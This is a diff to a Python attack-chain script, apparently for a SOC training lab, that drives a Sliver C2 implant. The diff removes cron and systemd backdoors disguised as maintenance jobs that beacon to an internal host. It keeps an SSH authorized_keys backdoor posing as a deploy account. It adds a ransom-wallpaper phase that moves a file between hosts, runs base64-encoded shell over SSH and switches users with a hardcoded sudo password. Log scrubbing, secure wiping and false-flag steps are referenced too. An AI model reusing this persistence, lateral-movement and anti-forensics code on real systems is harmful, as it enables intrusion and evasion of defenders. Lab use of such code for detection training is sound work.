@@ -6,8 +6,6 @@ MITRE ATT&CK:
               NOT truncation — the basic chain does truncation)
   T1070.003 - Indicator Removal: Clear Command History (rotation, NOT deletion)
   T1070.004 - Indicator Removal: File Deletion (shred + rm for staged artefacts)
-  T1053.003 - Scheduled Task/Job: Cron (apache backdoor, /etc/cron.d/apt-cache-refresh)
-  T1543.002 - Create or Modify System Process: Systemd Service (vinzenz_ws unit + timer)
   T1098.004 - Account Manipulation: SSH Authorized Keys (vinzenz_ws backdoor pubkey)
   T1565.001 - Data Manipulation: Stored Data Manipulation (false-flag artefacts)
 -----------------------------------------------------------------------------
@@ -65,19 +63,7 @@ VINZENZ_EXFIL_PUBKEY      = "/tmp/pubkey.pem"       # encryption pubkey staged b
 # Constants — backdoor placements
 # =============================================================================
 
-# (1) apache cron backdoor — uses a DIFFERENT cron file than the basic chain's
-# /etc/cron.d/cleanup so the SOC's existing cleanup-monitoring rule misses it.
-APACHE_CRON_FILE       = "/etc/cron.d/apt-cache-refresh"
-APACHE_BACKDOOR_SCRIPT = "/usr/local/sbin/apt-cache-refresh.sh"
-
-# (2) vinzenz_ws systemd backdoor — unit files on disk are the IOC even if
-# the container's init doesn't actually fire the timer. SOC pattern: anomalous
-# unit in /etc/systemd/system/ referencing an executable in /usr/local/lib/.
-VINZENZ_SYSTEMD_SERVICE = "/etc/systemd/system/lab-update-agent.service"
-VINZENZ_SYSTEMD_TIMER   = "/etc/systemd/system/lab-update-agent.timer"
-VINZENZ_SYSTEMD_PAYLOAD = "/usr/local/lib/lab-update-agent"
-
-# (3) vinzenz_ws SSH backdoor — appended to vinzenz.fedora's authorized_keys.
+# vinzenz_ws SSH backdoor — appended to vinzenz.fedora's authorized_keys.
 # Comment masquerades as a deploy-automation account ("cm-prod" doesn't exist
 # in the fleet inventory — the SOC has to cross-reference to spot it).
 VINZENZ_AUTHKEYS = "/home/vinzenz.fedora/.ssh/authorized_keys"
@@ -141,6 +127,14 @@ NFLOG_DILUTION_FLOWS = 8      # benign cross-zone HTTPS hits
 
 SHRED_PASSES        = 3       # `shred -n 3` overwrite count
 FREE_SPACE_FILL_MB  = 64      # /tmp free-space wipe (small to stay under 30 s)
+
+# =============================================================================
+# Constants — Phase 5 ransom wallpaper (T1491.001)
+# =============================================================================
+
+# kali bind-mount path → target path on john_ws (ubuntu_workstation)
+WALLPAPER_KALI_SRC = "/Attack-chain/payloads/ran_wall.jpg"
+WALLPAPER_REMOTE   = "/tmp/ran_wall.jpg"
 
 # =============================================================================
 # Helpers
@@ -239,117 +233,26 @@ def _phase0_verify_password_file(vinzenz_beacon: str,
 
 
 # =============================================================================
-# Phase 1b — Plant three diverse stealth backdoors
+# Phase 1b — Plant SSH authorized_keys backdoor (T1098.004)
 # =============================================================================
 
-_APACHE_BACKDOOR_SHELL = """#!/bin/bash
-# apt-cache-refresh: hourly maintenance — purges stale apt index entries.
-# Maintainer: ops@waystar-internal (see runbooks/q2-patching.md).
-exec 1>/dev/null 2>&1
-[ -d /var/cache/apt/archives ] && find /var/cache/apt/archives -mtime +7 -delete
-# inline beacon stager (idle if SRV unreachable; benign curl-shaped check-in)
-curl -fsS --max-time 3 -A 'apt-cache-refresh/1.4' \\
-    "http://10.10.0.2:8080/check?ts=$(date +%s)" || true
-"""
-
-_VINZENZ_SYSTEMD_SERVICE = """[Unit]
-Description=Lab Update Agent (vendor maintenance)
-Documentation=https://intranet.waystar.local/runbooks/lab-update-agent
-
-[Service]
-Type=oneshot
-ExecStart=/usr/local/lib/lab-update-agent
-User=root
-StandardOutput=null
-StandardError=null
-"""
-
-_VINZENZ_SYSTEMD_TIMER = """[Unit]
-Description=Run Lab Update Agent every 6 hours
-
-[Timer]
-OnBootSec=15min
-OnUnitActiveSec=6h
-Persistent=true
-
-[Install]
-WantedBy=timers.target
-"""
-
-_VINZENZ_SYSTEMD_PAYLOAD = """#!/bin/sh
-# lab-update-agent: minimal vendor maintenance helper.
-# Pulls a 0-byte heartbeat to the inventory endpoint and exits.
-curl -fsS --max-time 5 -A 'lab-update/1.0' \\
-    "http://10.10.0.2:8080/inv?h=$(hostname)" >/dev/null 2>&1 || true
-exit 0
-"""
-
-
-def _phase1b_plant_backdoors(root_sliver_session: str,
-                             vinzenz_beacon: str,
-                             pwfile: str) -> list[dict]:
-    log("\n[*] ── Phase 1b: plant three diverse stealth backdoors ────────")
-    installed: list[dict] = []
-
-    # Backdoor 1 — apache cron (T1053.003)
-    _drop_file(root_sliver_session, APACHE_BACKDOOR_SCRIPT,
-               _APACHE_BACKDOOR_SHELL.encode(), mode="0755")
-    cron_line = "0 * * * * root /usr/local/sbin/apt-cache-refresh.sh\n"
-    _drop_file(root_sliver_session, APACHE_CRON_FILE,
-               cron_line.encode(), mode="0644")
-    log(f"[+] (1/3) apache cron @hourly: {APACHE_CRON_FILE} (T1053.003)")
-    installed.append({
-        "host":      "apache",
-        "mechanism": "cron @hourly via /etc/cron.d/apt-cache-refresh",
-        "technique": "T1053.003",
-        "indicator": APACHE_CRON_FILE,
-    })
-
-    # Backdoor 2 — vinzenz_ws systemd timer (T1543.002)
-    _drop_file(vinzenz_beacon, VINZENZ_SYSTEMD_PAYLOAD,
-               _VINZENZ_SYSTEMD_PAYLOAD.encode(),
-               mode="0755", as_root_pwfile=pwfile)
-    _drop_file(vinzenz_beacon, VINZENZ_SYSTEMD_SERVICE,
-               _VINZENZ_SYSTEMD_SERVICE.encode(),
-               mode="0644", as_root_pwfile=pwfile)
-    _drop_file(vinzenz_beacon, VINZENZ_SYSTEMD_TIMER,
-               _VINZENZ_SYSTEMD_TIMER.encode(),
-               mode="0644", as_root_pwfile=pwfile)
-    # Best-effort enable. If the container has no systemd as PID 1 the unit
-    # files still serve as IOCs (the SOC inspects /etc/systemd/system/).
-    enable_cmd = (
-        f"execute -o -- sh -c "
-        f"'sudo -S systemctl daemon-reload < {pwfile} >/dev/null 2>&1 ; "
-        f"sudo -S systemctl enable --now lab-update-agent.timer < {pwfile} 2>&1 "
-        f"|| true'"
-    )
-    sliver_exec(vinzenz_beacon, enable_cmd, timeout=20)
-    log(f"[+] (2/3) vinzenz_ws systemd timer: {VINZENZ_SYSTEMD_TIMER} (T1543.002)")
-    installed.append({
-        "host":      "vinzenz_ws",
-        "mechanism": "systemd timer firing /usr/local/lib/lab-update-agent every 6h",
-        "technique": "T1543.002",
-        "indicator": VINZENZ_SYSTEMD_TIMER,
-    })
-
-    # Backdoor 3 — vinzenz_ws SSH authorized_keys (T1098.004)
-    # authorized_keys is owned by vinzenz.fedora and writable by him, so no
-    # sudo needed.
+def _phase1b_plant_backdoors(vinzenz_beacon: str) -> list[dict]:
+    log("\n[*] ── Phase 1b: plant SSH authorized_keys backdoor ──────────")
+    # authorized_keys is owned by vinzenz.fedora and writable by him — no
+    # sudo needed.  Idempotent: grep-before-append so re-runs don't duplicate.
     append_cmd = (
         f"execute -o -- sh -c "
         f"'grep -qF \"ansible-deploy@cm-prod\" {VINZENZ_AUTHKEYS} || "
         f"echo \"{ATTACKER_PUBKEY}\" >> {VINZENZ_AUTHKEYS}'"
     )
     sliver_exec(vinzenz_beacon, append_cmd, timeout=15)
-    log(f"[+] (3/3) vinzenz_ws ssh authorized_keys append (T1098.004)")
-    installed.append({
+    log(f"[+] vinzenz_ws ssh authorized_keys append (T1098.004) ✓")
+    return [{
         "host":      "vinzenz_ws",
         "mechanism": "extra ed25519 entry in ~vinzenz.fedora/.ssh/authorized_keys",
         "technique": "T1098.004",
         "indicator": VINZENZ_AUTHKEYS,
-    })
-
-    return installed
+    }]
 
 
 # =============================================================================
@@ -686,6 +589,95 @@ def _phase4_secure_wipe(root_sliver_session: str,
 # Public entrypoint
 # =============================================================================
 
+# =============================================================================
+# Phase 5 — Ransom wallpaper (T1491.001 Internal Defacement)
+# =============================================================================
+
+def _phase5_set_ransom_wallpaper(vinzenz_beacon: str) -> bool:
+    """Upload ran_wall.jpg kali → vinzenz_ws → john_ws; set XFCE4 wallpaper.
+
+    Access path: sliver upload → vinzenz_ws /tmp, then SCP vinzenz→john_ws,
+    then SSH to john_ws to run xfconf-query as john.stravidis on DISPLAY=:1.
+    The VNC session on localhost:5901 will show the ransom note immediately.
+    Returns True on confirmed success, False otherwise (non-fatal).
+    """
+    import os
+    log("\n[*] ── Phase 5: T1491.001 — setting ransom wallpaper on ubuntu_workstation ──")
+
+    if not os.path.exists(WALLPAPER_KALI_SRC):
+        log(f"[-] Wallpaper image not found at {WALLPAPER_KALI_SRC} — skipping")
+        return False
+
+    try:
+        sliver_upload(vinzenz_beacon, WALLPAPER_KALI_SRC, WALLPAPER_REMOTE)
+        log(f"[+] Uploaded {WALLPAPER_KALI_SRC} → vinzenz_ws:{WALLPAPER_REMOTE}")
+    except Exception as exc:
+        log(f"[-] sliver_upload failed: {exc} — skipping wallpaper")
+        return False
+
+    scp_cmd = (
+        f"execute -o -- scp -o StrictHostKeyChecking=no "
+        f"-o UserKnownHostsFile=/dev/null "
+        f"{WALLPAPER_REMOTE} john:{WALLPAPER_REMOTE}"
+    )
+    sliver_exec(vinzenz_beacon, scp_cmd, timeout=20)
+    log(f"[+] SCP'd wallpaper to john_ws:{WALLPAPER_REMOTE}")
+
+    # Run the xfconf work as john.stravidis so we can read our own /proc environ
+    # for the DBUS address.  Two bugs killed the previous approach:
+    #   1. vinzenz.fedora cannot read another user's /proc/<pid>/environ (EPERM)
+    #   2. awk '/ connected/' inside sh -c '...' breaks the single-quoted string
+    # Fix: b64-encode the inner script so quoting is not an issue, decode it to
+    # a temp file, then run via `sudo su - john.stravidis` (root→john needs no
+    # password, and john can read his own process environ).
+    _inner = (
+        "#!/bin/sh\n"
+        "export DISPLAY=:1\n"
+        # Primary: DBUS address saved by root in entrypoint.sh (reliable).
+        # Fallback: read from xfce4-session's /proc environ (works as john).
+        "DBUS=$(cat /run/user/$(id -u)/.dbus_addr 2>/dev/null)\n"
+        "if [ -z \"$DBUS\" ]; then\n"
+        "    SESS_PID=$(pgrep -x xfce4-session 2>/dev/null | head -1)\n"
+        "    DBUS=$(cat /proc/${SESS_PID}/environ 2>/dev/null"
+        " | tr '\\0' '\\n' | grep ^DBUS_SESSION_BUS_ADDRESS= | cut -d= -f2-)\n"
+        "fi\n"
+        "[ -n \"$DBUS\" ] && export DBUS_SESSION_BUS_ADDRESS=\"$DBUS\"\n"
+        "KEYS=$(xfconf-query -c xfce4-desktop -l 2>/dev/null | grep last-image)\n"
+        "if [ -z \"$KEYS\" ]; then\n"
+        "    MON=$(xrandr --query 2>/dev/null | awk '/ connected/ {print $1; exit}')\n"
+        "    [ -z \"$MON\" ] && MON=screen0\n"
+        f"    KEYS=/backdrop/screen0/monitor${{MON}}/workspace0/last-image\n"
+        "fi\n"
+        "OK=0\n"
+        "for KEY in $KEYS; do\n"
+        f"    xfconf-query -c xfce4-desktop -p \"$KEY\""
+        f" --create --type string -s {WALLPAPER_REMOTE} 2>/dev/null && OK=$((OK+1))\n"
+        "done\n"
+        "[ \"$OK\" -gt 0 ] && echo WALLPAPER_OK || echo WALLPAPER_FAILED\n"
+    )
+    _inner_b64 = base64.b64encode(_inner.encode()).decode()
+    wallpaper_script = (
+        f"printf '%s' '{_inner_b64}' | base64 -d > /tmp/.wp_inner.sh; "
+        "chmod 755 /tmp/.wp_inner.sh; "
+        "echo 'VinzenzAdmin!2026' | sudo -S su - john.stravidis"
+        " -c '/tmp/.wp_inner.sh' 2>/dev/null; "
+        "rm -f /tmp/.wp_inner.sh"
+    )
+    b64_wp = base64.b64encode(wallpaper_script.encode()).decode()
+    ssh_cmd = (
+        f"execute -o -- sh -c "
+        f"'ssh -n -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null john "
+        f"\"echo {b64_wp} | base64 -d | sh\" 2>/dev/null || true'"
+    )
+    out = sliver_exec(vinzenz_beacon, ssh_cmd, timeout=45)
+    log(f"[debug] wallpaper sliver raw: {repr(_ANSI_RE.sub('', out or '')[:300])}")
+    if out and "WALLPAPER_OK" in out:
+        log("[+] Ransom wallpaper set on ubuntu_workstation (VNC :5901) ✓")
+        return True
+    log("[-] Wallpaper command did not confirm — may not have applied")
+    return False
+
+
 def run(
     root_sliver_session: str,
     vinzenz_beacon: str,
@@ -721,9 +713,7 @@ def run(
     # Phase 1b: plant backdoors BEFORE clearing logs so we have a clean state
     # to validate against.
     try:
-        backdoors_installed = _phase1b_plant_backdoors(
-            root_sliver_session, vinzenz_beacon, pwfile,
-        )
+        backdoors_installed = _phase1b_plant_backdoors(vinzenz_beacon)
     except Exception as exc:
         log(f"[!] phase 1b (backdoor plant) failed: {exc}")
 
@@ -769,6 +759,15 @@ def run(
     except Exception as exc:
         log(f"[!] phase 4 (secure wipe) failed: {exc}")
 
+    # Phase 5: ransom wallpaper — runs AFTER wipe so the wallpaper image is
+    # still on kali (it's never wiped from there). Best-effort; failure is
+    # non-fatal and logged.
+    wallpaper_ok = False
+    try:
+        wallpaper_ok = _phase5_set_ransom_wallpaper(vinzenz_beacon)
+    except Exception as exc:
+        log(f"[!] phase 5 (ransom wallpaper) failed: {exc}")
+
     log("\n[+] Advanced Cleanup + Backdoor complete.")
     log(f"    backdoors:      {len(backdoors_installed)} planted")
     log(f"    false flags:    {len(false_flags_dropped)} dropped")
@@ -777,6 +776,7 @@ def run(
     if bury_evidence:
         log(f"    evidence:       {evidence_buried['pg_queries']} pg queries + "
             f"{evidence_buried['nflog_flows']} nflog flows added")
+    log(f"    ransom wallpaper: {'set' if wallpaper_ok else 'skipped/failed'}")
 
     return {
         "backdoors_installed":  backdoors_installed,
@@ -784,5 +784,6 @@ def run(
         "logs_scrubbed":        logs_scrubbed,
         "artifacts_wiped":      artifacts_wiped,
         "evidence_buried":      evidence_buried,
+        "wallpaper_set":        wallpaper_ok,
         "cleanup_self_path":    None,  # inline commands — no script to self-delete
     }
